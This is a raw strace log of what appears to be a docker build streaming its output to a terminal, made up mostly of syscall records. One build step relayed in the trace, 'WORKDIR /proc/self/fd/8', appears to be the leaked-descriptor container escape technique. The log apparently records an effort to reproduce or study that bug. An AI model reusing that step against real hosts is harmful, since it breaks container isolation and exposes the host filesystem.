113251 03:07:16.124848 ppoll([{fd=11<UNIX-STREAM:[280011->280012]>, events=POLLIN}, {fd=3<pipe:[279955]>, events=POLLIN}, {fd=9</dev/ptmx<char 5:2>>, events=POLLIN}, {fd=8</dev/tty<char 5:0>>, events=POLLIN}], 4, NULL, NULL, 8 <unfinished ...>
113254 03:07:16.124881 <... nanosleep resumed>NULL) = 0 <0.002404>
113254 03:07:16.124894 futex(0x55c9e4ddd060, FUTEX_WAIT_PRIVATE, 0, {tv_sec=4, tv_nsec=938446083} <unfinished ...>
113253 03:07:16.234283 <... epoll_pwait resumed>[{events=EPOLLOUT, data={u32=3998744578, u64=9204545914999930882}}], 128, 4938, NULL, 0) = 1 <0.109901>
113253 03:07:16.234340 epoll_pwait(4<anon_inode:[eventpoll]>, [], 128, 0, NULL, 0) = 0 <0.000004>
113253 03:07:16.234370 epoll_pwait(4<anon_inode:[eventpoll]>, [{events=EPOLLIN|EPOLLOUT, data={u32=3998744578, u64=9204545914999930882}}], 128, 4828, NULL, 0) = 1 <0.000120>
113253 03:07:16.234524 futex(0x55c9e4ddd060, FUTEX_WAKE_PRIVATE, 1 <unfinished ...>
113254 03:07:16.234542 <... futex resumed>) = 0 <0.109640>
113253 03:07:16.234548 <... futex resumed>) = 1 <0.000014>
113254 03:07:16.234560 nanosleep({tv_sec=0, tv_nsec=20000},  <unfinished ...>
113253 03:07:16.234569 read(3<UNIX-STREAM:[280071->279015]>, "HTTP/1.1 200 OK\r\nApi-Version: 1.41\r\nContent-Type: application/json\r\nDocker-Experimental: false\r\nOstype: linux\r\nServer: Docker/20.10.25+dfsg1 (linux)\r\nDate: Sat, 30 Mar 2024 07:07:16 GMT\r\nTransfer-Encoding: chunked\r\n\r\n2e\r\n{\"stream\":\"Step 1/3 : FROM debian:b"..., 4096) = 269 <0.000009>
113253 03:07:16.234638 futex(0xc00042a548, FUTEX_WAKE_PRIVATE, 1 <unfinished ...>
113258 03:07:16.234652 <... futex resumed>) = 0 <0.110083>
113253 03:07:16.234662 <... futex resumed>) = 1 <0.000017>
113258 03:07:16.234905 epoll_pwait(4<anon_inode:[eventpoll]>,  <unfinished ...>
113253 03:07:16.234925 write(1</dev/pts/8<char 136:8>>, "Step 1/3 : FROM debian:bookworm", 31 <unfinished ...>
113258 03:07:16.234950 <... epoll_pwait resumed>[], 128, 0, NULL, 0) = 0 <0.000029>
113253 03:07:16.234961 <... write resumed>) = 31 <0.000021>
113258 03:07:16.234996 epoll_pwait(4<anon_inode:[eventpoll]>,  <unfinished ...>
113253 03:07:16.235015 read(3<UNIX-STREAM:[280071->279015]>, 0xc00032c000, 4096) = -1 EAGAIN (Resource temporarily unavailable) <0.000005>
113253 03:07:16.235043 futex(0x55c9e4ddcca8, FUTEX_WAIT_PRIVATE, 0, NULL <unfinished ...>
113251 03:07:16.235066 <... ppoll resumed>) = 1 ([{fd=9, revents=POLLIN}]) <0.110198>
113251 03:07:16.235086 rt_sigaction(SIGTTIN, {sa_handler=0x5567758b9420, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f1dfcf20510}, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510}, 8) = 0 <0.000004>
113251 03:07:16.235108 read(9</dev/ptmx<char 5:2>>, "Step 1/3 : FROM debian:bookworm", 65536) = 31 <0.000005>
113251 03:07:16.235132 rt_sigaction(SIGTTIN, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510}, NULL, 8) = 0 <0.000003>
113251 03:07:16.235150 rt_sigprocmask(SIG_BLOCK, [INT QUIT TSTP TTIN TTOU], [], 8) = 0 <0.000003>
113251 03:07:16.235169 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0 <0.000003>
113251 03:07:16.235186 ppoll([{fd=11<UNIX-STREAM:[280011->280012]>, events=POLLIN}, {fd=3<pipe:[279955]>, events=POLLIN}, {fd=9</dev/ptmx<char 5:2>>, events=POLLIN}, {fd=8</dev/tty<char 5:0>>, events=POLLIN}, {fd=8</dev/tty<char 5:0>>, events=POLLOUT}], 5, NULL, NULL, 8) = 1 ([{fd=8, revents=POLLOUT}]) <0.000006>
113251 03:07:16.235227 rt_sigaction(SIGTTOU, {sa_handler=0x5567758b9430, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f1dfcf20510}, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510}, 8) = 0 <0.000003>
113251 03:07:16.235246 write(8</dev/tty<char 5:0>>, "Step 1/3 : FROM debian:bookworm", 31) = 31 <0.000006>
113251 03:07:16.235268 rt_sigaction(SIGTTOU, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510}, NULL, 8) = 0 <0.000003>
113251 03:07:16.235285 ppoll([{fd=11<UNIX-STREAM:[280011->280012]>, events=POLLIN}, {fd=3<pipe:[279955]>, events=POLLIN}, {fd=9</dev/ptmx<char 5:2>>, events=POLLIN}, {fd=8</dev/tty<char 5:0>>, events=POLLIN}], 4, NULL, NULL, 8 <unfinished ...>
113254 03:07:16.235543 <... nanosleep resumed>NULL) = 0 <0.000973>
113254 03:07:16.235563 futex(0x55c9e4ddd060, FUTEX_WAIT_PRIVATE, 0, {tv_sec=4, tv_nsec=827777292} <unfinished ...>
113258 03:07:16.236260 <... epoll_pwait resumed>[{events=EPOLLIN|EPOLLOUT, data={u32=3998744578, u64=9204545914999930882}}], 128, 4828, NULL, 0) = 1 <0.001248>
113258 03:07:16.236286 futex(0x55c9e4ddd060, FUTEX_WAKE_PRIVATE, 1) = 1 <0.000006>
113254 03:07:16.236305 <... futex resumed>) = 0 <0.000732>
113258 03:07:16.236311 read(3<UNIX-STREAM:[280071->279015]>, "11\r\n{\"stream\":\"\\n\"}\r\n\r\n", 4096) = 23 <0.000009>
113254 03:07:16.236353 nanosleep({tv_sec=0, tv_nsec=20000},  <unfinished ...>
113258 03:07:16.236363 write(1</dev/pts/8<char 136:8>>, "\n", 1) = 1 <0.000008>
113258 03:07:16.236394 read(3<UNIX-STREAM:[280071->279015]>, 0xc00032c000, 4096) = -1 EAGAIN (Resource temporarily unavailable) <0.000004>
113258 03:07:16.236417 epoll_pwait(4<anon_inode:[eventpoll]>, [], 128, 0, NULL, 0) = 0 <0.000003>
113258 03:07:16.236435 epoll_pwait(4<anon_inode:[eventpoll]>,  <unfinished ...>
113251 03:07:16.236455 <... ppoll resumed>) = 1 ([{fd=9, revents=POLLIN}]) <0.001154>
113251 03:07:16.236469 rt_sigaction(SIGTTIN, {sa_handler=0x5567758b9420, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f1dfcf20510}, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510}, 8) = 0 <0.000003>
113251 03:07:16.236488 read(9</dev/ptmx<char 5:2>>, "\r\n", 65536) = 2 <0.000004>
113251 03:07:16.236510 rt_sigaction(SIGTTIN, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510}, NULL, 8) = 0 <0.000003>
113251 03:07:16.236526 rt_sigprocmask(SIG_BLOCK, [INT QUIT TSTP TTIN TTOU], [], 8) = 0 <0.000003>
113251 03:07:16.236544 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0 <0.000003>
113251 03:07:16.236560 ppoll([{fd=11<UNIX-STREAM:[280011->280012]>, events=POLLIN}, {fd=3<pipe:[279955]>, events=POLLIN}, {fd=9</dev/ptmx<char 5:2>>, events=POLLIN}, {fd=8</dev/tty<char 5:0>>, events=POLLIN}, {fd=8</dev/tty<char 5:0>>, events=POLLOUT}], 5, NULL, NULL, 8) = 1 ([{fd=8, revents=POLLOUT}]) <0.000005>
113251 03:07:16.236593 rt_sigaction(SIGTTOU, {sa_handler=0x5567758b9430, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f1dfcf20510}, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510}, 8) = 0 <0.000003>
113251 03:07:16.236611 write(8</dev/tty<char 5:0>>, "\r\n", 2) = 2 <0.000005>
113251 03:07:16.236632 rt_sigaction(SIGTTOU, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510}, NULL, 8) = 0 <0.000003>
113251 03:07:16.236648 ppoll([{fd=11<UNIX-STREAM:[280011->280012]>, events=POLLIN}, {fd=3<pipe:[279955]>, events=POLLIN}, {fd=9</dev/ptmx<char 5:2>>, events=POLLIN}, {fd=8</dev/tty<char 5:0>>, events=POLLIN}], 4, NULL, NULL, 8 <unfinished ...>
113254 03:07:16.236891 <... nanosleep resumed>NULL) = 0 <0.000527>
113254 03:07:16.236910 futex(0x55c9e4ddd060, FUTEX_WAIT_PRIVATE, 0, {tv_sec=4, tv_nsec=826429562} <unfinished ...>
113258 03:07:16.237109 <... epoll_pwait resumed>[{events=EPOLLIN|EPOLLOUT, data={u32=3998744578, u64=9204545914999930882}}], 128, 4826, NULL, 0) = 1 <0.000665>
113258 03:07:16.237132 futex(0x55c9e4ddd060, FUTEX_WAKE_PRIVATE, 1) = 1 <0.000009>
113254 03:07:16.237180 <... futex resumed>) = 0 <0.000260>
113258 03:07:16.237189 read(3<UNIX-STREAM:[280071->279015]>, "28\r\n{\"stream\":\" ---\\u003e c978d997d5fe\\n\"}\r\n\r\n", 4096) = 46 <0.000009>
113254 03:07:16.237228 nanosleep({tv_sec=0, tv_nsec=20000},  <unfinished ...>
113258 03:07:16.237239 write(1</dev/pts/8<char 136:8>>, " ---> c978d997d5fe\n", 19) = 19 <0.000139>
113254 03:07:16.237408 <... nanosleep resumed>NULL) = 0 <0.000170>
113258 03:07:16.237418 read(3<UNIX-STREAM:[280071->279015]>, 0xc00032c000, 4096) = -1 EAGAIN (Resource temporarily unavailable) <0.000007>
113254 03:07:16.237445 nanosleep({tv_sec=0, tv_nsec=20000},  <unfinished ...>
113258 03:07:16.237455 epoll_pwait(4<anon_inode:[eventpoll]>, [], 128, 0, NULL, 0) = 0 <0.000130>
113254 03:07:16.237610 <... nanosleep resumed>NULL) = 0 <0.000156>
113258 03:07:16.237620 epoll_pwait(4<anon_inode:[eventpoll]>,  <unfinished ...>
113254 03:07:16.237636 futex(0x55c9e4ddd060, FUTEX_WAIT_PRIVATE, 0, {tv_sec=4, tv_nsec=825703432} <unfinished ...>
113251 03:07:16.237657 <... ppoll resumed>) = 1 ([{fd=9, revents=POLLIN}]) <0.000993>
113251 03:07:16.237671 rt_sigaction(SIGTTIN, {sa_handler=0x5567758b9420, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f1dfcf20510}, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510}, 8) = 0 <0.000003>
113251 03:07:16.237690 read(9</dev/ptmx<char 5:2>>, " ---> c978d997d5fe\r\n", 65536) = 20 <0.000005>
113251 03:07:16.237713 rt_sigaction(SIGTTIN, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510}, NULL, 8) = 0 <0.000003>
113251 03:07:16.237729 rt_sigprocmask(SIG_BLOCK, [INT QUIT TSTP TTIN TTOU], [], 8) = 0 <0.000003>
113251 03:07:16.237747 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0 <0.000003>
113251 03:07:16.237763 ppoll([{fd=11<UNIX-STREAM:[280011->280012]>, events=POLLIN}, {fd=3<pipe:[279955]>, events=POLLIN}, {fd=9</dev/ptmx<char 5:2>>, events=POLLIN}, {fd=8</dev/tty<char 5:0>>, events=POLLIN}, {fd=8</dev/tty<char 5:0>>, events=POLLOUT}], 5, NULL, NULL, 8) = 1 ([{fd=8, revents=POLLOUT}]) <0.000005>
113251 03:07:16.237796 rt_sigaction(SIGTTOU, {sa_handler=0x5567758b9430, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f1dfcf20510}, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510}, 8) = 0 <0.000015>
113251 03:07:16.237833 write(8</dev/tty<char 5:0>>, " ---> c978d997d5fe\r\n", 20) = 20 <0.000006>
113251 03:07:16.237859 rt_sigaction(SIGTTOU, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510}, NULL, 8) = 0 <0.000003>
113251 03:07:16.237878 ppoll([{fd=11<UNIX-STREAM:[280011->280012]>, events=POLLIN}, {fd=3<pipe:[279955]>, events=POLLIN}, {fd=9</dev/ptmx<char 5:2>>, events=POLLIN}, {fd=8</dev/tty<char 5:0>>, events=POLLIN}], 4, NULL, NULL, 8 <unfinished ...>
113258 03:07:16.238010 <... epoll_pwait resumed>[{events=EPOLLIN|EPOLLOUT, data={u32=3998744578, u64=9204545914999930882}}], 128, 4825, NULL, 0) = 1 <0.000379>
113258 03:07:16.238034 futex(0x55c9e4ddd060, FUTEX_WAKE_PRIVATE, 1) = 1 <0.000006>
113254 03:07:16.238053 <... futex resumed>) = 0 <0.000408>
113258 03:07:16.238059 read(3<UNIX-STREAM:[280071->279015]>, "31\r\n{\"stream\":\"Step 2/3 : WORKDIR /proc/self/fd/8\"}\r\n\r\n", 4096) = 55 <0.000202>
113254 03:07:16.238300 nanosleep({tv_sec=0, tv_nsec=20000},  <unfinished ...>
113258 03:07:16.238313 write(1</dev/pts/8<char 136:8>>, "Step 2/3 : WORKDIR /proc/self/fd/8", 34) = 34 <0.000135>
113254 03:07:16.238479 <... nanosleep resumed>NULL) = 0 <0.000167>
113258 03:07:16.238490 read(3<UNIX-STREAM:[280071->279015]>, 0xc00032c000, 4096) = -1 EAGAIN (Resource temporarily unavailable) <0.000007>
113254 03:07:16.238517 nanosleep({tv_sec=0, tv_nsec=20000},  <unfinished ...>
113258 03:07:16.238527 epoll_pwait(4<anon_inode:[eventpoll]>, [], 128, 0, NULL, 0) = 0 <0.000129>
113254 03:07:16.238680 <... nanosleep resumed>NULL) = 0 <0.000155>
113258 03:07:16.238691 epoll_pwait(4<anon_inode:[eventpoll]>,  <unfinished ...>
113254 03:07:16.238707 futex(0x55c9e4ddd060, FUTEX_WAIT_PRIVATE, 0, {tv_sec=4, tv_nsec=824632707} <unfinished ...>
113251 03:07:16.238753 <... ppoll resumed>) = 1 ([{fd=9, revents=POLLIN}]) <0.000858>
113251 03:07:16.238772 rt_sigaction(SIGTTIN, {sa_handler=0x5567758b9420, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f1dfcf20510}, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510}, 8) = 0 <0.000008>
113251 03:07:16.238815 read(9</dev/ptmx<char 5:2>>, "Step 2/3 : WORKDIR /proc/self/fd/8", 65536) = 34 <0.000005>
113251 03:07:16.238841 rt_sigaction(SIGTTIN, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510}, NULL, 8) = 0 <0.000003>
113251 03:07:16.238858 rt_sigprocmask(SIG_BLOCK, [INT QUIT TSTP TTIN TTOU], [], 8) = 0 <0.000003>
113251 03:07:16.238876 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0 <0.000003>
113251 03:07:16.238893 ppoll([{fd=11<UNIX-STREAM:[280011->280012]>, events=POLLIN}, {fd=3<pipe:[279955]>, events=POLLIN}, {fd=9</dev/ptmx<char 5:2>>, events=POLLIN}, {fd=8</dev/tty<char 5:0>>, events=POLLIN}, {fd=8</dev/tty<char 5:0>>, events=POLLOUT}], 5, NULL, NULL, 8) = 1 ([{fd=8, revents=POLLOUT}]) <0.000006>
113251 03:07:16.238927 rt_sigaction(SIGTTOU, {sa_handler=0x5567758b9430, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f1dfcf20510}, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510}, 8) = 0 <0.000003>
113251 03:07:16.238946 write(8</dev/tty<char 5:0>>, "Step 2/3 : WORKDIR /proc/self/fd/8", 34) = 34 <0.000005>
113251 03:07:16.238967 rt_sigaction(SIGTTOU, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510}, NULL, 8) = 0 <0.000003>
113251 03:07:16.238984 ppoll([{fd=11<UNIX-STREAM:[280011->280012]>, events=POLLIN}, {fd=3<pipe:[279955]>, events=POLLIN}, {fd=9</dev/ptmx<char 5:2>>, events=POLLIN}, {fd=8</dev/tty<char 5:0>>, events=POLLIN}], 4, NULL, NULL, 8 <unfinished ...>
113258 03:07:16.239104 <... epoll_pwait resumed>[{events=EPOLLIN|EPOLLOUT, data={u32=3998744578, u64=9204545914999930882}}], 128, 4824, NULL, 0) = 1 <0.000402>
113258 03:07:16.239129 futex(0x55c9e4ddd060, FUTEX_WAKE_PRIVATE, 1) = 1 <0.000006>
113254 03:07:16.239147 <... futex resumed>) = 0 <0.000410>
113258 03:07:16.239157 read(3<UNIX-STREAM:[280071->279015]>,  <unfinished ...>
113254 03:07:16.239173 nanosleep({tv_sec=0, tv_nsec=20000},  <unfinished ...>
113258 03:07:16.239223 <... read resumed>"11\r\n{\"stream\":\"\\n\"}\r\n\r\n", 4096) = 23 <0.000054>
113258 03:07:16.239254 write(1</dev/pts/8<char 136:8>>, "\n", 1) = 1 <0.000012>
113251 03:07:16.239290 <... ppoll resumed>) = 1 ([{fd=9, revents=POLLIN}]) <0.000290>
113258 03:07:16.239304 read(3<UNIX-STREAM:[280071->279015]>,  <unfinished ...>
113251 03:07:16.239317 rt_sigaction(SIGTTIN, {sa_handler=0x5567758b9420, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f1dfcf20510},  <unfinished ...>
113258 03:07:16.239329 <... read resumed>0xc00032c000, 4096) = -1 EAGAIN (Resource temporarily unavailable) <0.000015>
113251 03:07:16.239340 <... rt_sigaction resumed>{sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510}, 8) = 0 <0.000015>
113258 03:07:16.239351 epoll_pwait(4<anon_inode:[eventpoll]>,  <unfinished ...>
113251 03:07:16.239363 read(9</dev/ptmx<char 5:2>>,  <unfinished ...>
113258 03:07:16.239376 <... epoll_pwait resumed>[], 128, 0, NULL, 0) = 0 <0.000016>
113251 03:07:16.239386 <... read resumed>"\r\n", 65536) = 2 <0.000015>
113258 03:07:16.239397 epoll_pwait(4<anon_inode:[eventpoll]>,  <unfinished ...>
113251 03:07:16.239409 rt_sigaction(SIGTTIN, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510}, NULL, 8) = 0 <0.000004>
113251 03:07:16.239426 rt_sigprocmask(SIG_BLOCK, [INT QUIT TSTP TTIN TTOU], [], 8) = 0 <0.000003>
113251 03:07:16.239443 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0 <0.000003>
113251 03:07:16.239459 ppoll([{fd=11<UNIX-STREAM:[280011->280012]>, events=POLLIN}, {fd=3<pipe:[279955]>, events=POLLIN}, {fd=9</dev/ptmx<char 5:2>>, events=POLLIN}, {fd=8</dev/tty<char 5:0>>, events=POLLIN}, {fd=8</dev/tty<char 5:0>>, events=POLLOUT}], 5, NULL, NULL, 8) = 1 ([{fd=8, revents=POLLOUT}]) <0.000008>
113251 03:07:16.239522 rt_sigaction(SIGTTOU, {sa_handler=0x5567758b9430, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f1dfcf20510}, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510}, 8) = 0 <0.000004>
113251 03:07:16.239544 write(8</dev/tty<char 5:0>>, "\r\n", 2 <unfinished ...>
113254 03:07:16.239799 <... nanosleep resumed>NULL) = 0 <0.000617>
113251 03:07:16.239820 <... write resumed>) = 2 <0.000264>
113254 03:07:16.239832 futex(0x55c9e4ddd060, FUTEX_WAIT_PRIVATE, 0, {tv_sec=4, tv_nsec=823519689} <unfinished ...>
113251 03:07:16.239901 rt_sigaction(SIGTTOU, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510}, NULL, 8) = 0 <0.000006>
113251 03:07:16.239934 ppoll([{fd=11<UNIX-STREAM:[280011->280012]>, events=POLLIN}, {fd=3<pipe:[279955]>, events=POLLIN}, {fd=9</dev/ptmx<char 5:2>>, events=POLLIN}, {fd=8</dev/tty<char 5:0>>, events=POLLIN}], 4, NULL, NULL, 8 <unfinished ...>
113258 03:07:16.240142 <... epoll_pwait resumed>[{events=EPOLLIN|EPOLLOUT, data={u32=3998744578, u64=9204545914999930882}}], 128, 4823, NULL, 0) = 1 <0.000736>
113258 03:07:16.240165 futex(0x55c9e4ddd060, FUTEX_WAKE_PRIVATE, 1) = 1 <0.000006>
113254 03:07:16.240183 <... futex resumed>) = 0 <0.000294>
113258 03:07:16.240193 read(3<UNIX-STREAM:[280071->279015]>,  <unfinished ...>
113254 03:07:16.240209 nanosleep({tv_sec=0, tv_nsec=20000},  <unfinished ...>
113258 03:07:16.240362 <... read resumed>"27\r\n{\"stream\":\" ---\\u003e Using cache\\n\"}\r\n\r\n", 4096) = 45 <0.000158>
113254 03:07:16.240393 <... nanosleep resumed>NULL) = 0 <0.000175>
113258 03:07:16.240406 write(1</dev/pts/8<char 136:8>>, " ---> Using cache\n", 18 <unfinished ...>
113254 03:07:16.240434 nanosleep({tv_sec=0, tv_nsec=20000},  <unfinished ...>
113258 03:07:16.240485 <... write resumed>) = 18 <0.000064>
113251 03:07:16.240507 <... ppoll resumed>) = 1 ([{fd=9, revents=POLLIN}]) <0.000550>
113258 03:07:16.240523 read(3<UNIX-STREAM:[280071->279015]>,  <unfinished ...>
113251 03:07:16.240537 rt_sigaction(SIGTTIN, {sa_handler=0x5567758b9420, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f1dfcf20510},  <unfinished ...>
113258 03:07:16.240549 <... read resumed>0xc00032c000, 4096) = -1 EAGAIN (Resource temporarily unavailable) <0.000016>
113251 03:07:16.240561 <... rt_sigaction resumed>{sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510}, 8) = 0 <0.000016>
113258 03:07:16.240573 epoll_pwait(4<anon_inode:[eventpoll]>,  <unfinished ...>
113251 03:07:16.240584 read(9</dev/ptmx<char 5:2>>,  <unfinished ...>
113258 03:07:16.240598 <... epoll_pwait resumed>[], 128, 0, NULL, 0) = 0 <0.000017>
113251 03:07:16.240608 <... read resumed>" ---> Using cache\r\n", 65536) = 19 <0.000015>
113258 03:07:16.240619 epoll_pwait(4<anon_inode:[eventpoll]>,  <unfinished ...>
113251 03:07:16.240631 rt_sigaction(SIGTTIN, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510}, NULL, 8) = 0 <0.000004>
113251 03:07:16.240647 rt_sigprocmask(SIG_BLOCK, [INT QUIT TSTP TTIN TTOU], [], 8) = 0 <0.000003>
113251 03:07:16.240665 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0 <0.000003>
113251 03:07:16.240681 ppoll([{fd=11<UNIX-STREAM:[280011->280012]>, events=POLLIN}, {fd=3<pipe:[279955]>, events=POLLIN}, {fd=9</dev/ptmx<char 5:2>>, events=POLLIN}, {fd=8</dev/tty<char 5:0>>, events=POLLIN}, {fd=8</dev/tty<char 5:0>>, events=POLLOUT}], 5, NULL, NULL, 8) = 1 ([{fd=8, revents=POLLOUT}]) <0.000006>
113251 03:07:16.240716 rt_sigaction(SIGTTOU, {sa_handler=0x5567758b9430, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f1dfcf20510}, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510}, 8) = 0 <0.000003>
113251 03:07:16.240745 write(8</dev/tty<char 5:0>>, " ---> Using cache\r\n", 19 <unfinished ...>
113254 03:07:16.240992 <... nanosleep resumed>NULL) = 0 <0.000548>
113251 03:07:16.241010 <... write resumed>) = 19 <0.000249>
113254 03:07:16.241048 futex(0x55c9e4ddd060, FUTEX_WAIT_PRIVATE, 0, {tv_sec=4, tv_nsec=822328570} <unfinished ...>
113251 03:07:16.241065 rt_sigaction(SIGTTOU, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510}, NULL, 8) = 0 <0.000004>
113251 03:07:16.241085 ppoll([{fd=11<UNIX-STREAM:[280011->280012]>, events=POLLIN}, {fd=3<pipe:[279955]>, events=POLLIN}, {fd=9</dev/ptmx<char 5:2>>, events=POLLIN}, {fd=8</dev/tty<char 5:0>>, events=POLLIN}], 4, NULL, NULL, 8 <unfinished ...>
113258 03:07:16.241136 <... epoll_pwait resumed>[{events=EPOLLIN|EPOLLOUT, data={u32=3998744578, u64=9204545914999930882}}], 128, 4822, NULL, 0) = 1 <0.000509>
113258 03:07:16.241154 futex(0x55c9e4ddd060, FUTEX_WAKE_PRIVATE, 1) = 1 <0.000006>
113254 03:07:16.241172 <... futex resumed>) = 0 <0.000111>
113258 03:07:16.241181 read(3<UNIX-STREAM:[280071->279015]>,  <unfinished ...>
113254 03:07:16.241195 nanosleep({tv_sec=0, tv_nsec=20000},  <unfinished ...>
113258 03:07:16.241338 <... read resumed>"28\r\n{\"stream\":\" ---\\u003e e55768d762db\\n\"}\r\n\r\n", 4096) = 46 <0.000147>
113254 03:07:16.241368 <... nanosleep resumed>NULL) = 0 <0.000165>
113258 03:07:16.241381 write(1</dev/pts/8<char 136:8>>, " ---> e55768d762db\n", 19 <unfinished ...>
113254 03:07:16.241408 nanosleep({tv_sec=0, tv_nsec=20000},  <unfinished ...>
113258 03:07:16.241457 <... write resumed>) = 19 <0.000061>
113251 03:07:16.241479 <... ppoll resumed>) = 1 ([{fd=9, revents=POLLIN}]) <0.000374>
113258 03:07:16.241496 read(3<UNIX-STREAM:[280071->279015]>,  <unfinished ...>
113251 03:07:16.241510 rt_sigaction(SIGTTIN, {sa_handler=0x5567758b9420, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f1dfcf20510},  <unfinished ...>
113258 03:07:16.241522 <... read resumed>0xc00032c000, 4096) = -1 EAGAIN (Resource temporarily unavailable) <0.000016>
113251 03:07:16.241534 <... rt_sigaction resumed>{sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510}, 8) = 0 <0.000016>
113258 03:07:16.241545 epoll_pwait(4<anon_inode:[eventpoll]>,  <unfinished ...>
113251 03:07:16.241556 read(9</dev/ptmx<char 5:2>>,  <unfinished ...>
113258 03:07:16.241570 <... epoll_pwait resumed>[], 128, 0, NULL, 0) = 0 <0.000016>
113251 03:07:16.241580 <... read resumed>" ---> e55768d762db\r\n", 65536) = 20 <0.000015>
113258 03:07:16.241591 epoll_pwait(4<anon_inode:[eventpoll]>,  <unfinished ...>
113251 03:07:16.241602 rt_sigaction(SIGTTIN, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510}, NULL, 8) = 0 <0.000003>
113251 03:07:16.241619 rt_sigprocmask(SIG_BLOCK, [INT QUIT TSTP TTIN TTOU], [], 8) = 0 <0.000003>
113251 03:07:16.241636 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0 <0.000003>
113251 03:07:16.241652 ppoll([{fd=11<UNIX-STREAM:[280011->280012]>, events=POLLIN}, {fd=3<pipe:[279955]>, events=POLLIN}, {fd=9</dev/ptmx<char 5:2>>, events=POLLIN}, {fd=8</dev/tty<char 5:0>>, events=POLLIN}, {fd=8</dev/tty<char 5:0>>, events=POLLOUT}], 5, NULL, NULL, 8) = 1 ([{fd=8, revents=POLLOUT}]) <0.000006>
113251 03:07:16.241687 rt_sigaction(SIGTTOU, {sa_handler=0x5567758b9430, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f1dfcf20510}, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510}, 8) = 0 <0.000003>
113251 03:07:16.241705 write(8</dev/tty<char 5:0>>, " ---> e55768d762db\r\n", 20 <unfinished ...>
113254 03:07:16.241952 <... nanosleep resumed>NULL) = 0 <0.000535>
113251 03:07:16.241971 <... write resumed>) = 20 <0.000242>
113254 03:07:16.241982 futex(0x55c9e4ddd060, FUTEX_WAIT_PRIVATE, 0, {tv_sec=4, tv_nsec=821367811} <unfinished ...>
113251 03:07:16.241995 rt_sigaction(SIGTTOU, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510}, NULL, 8) = 0 <0.000003>
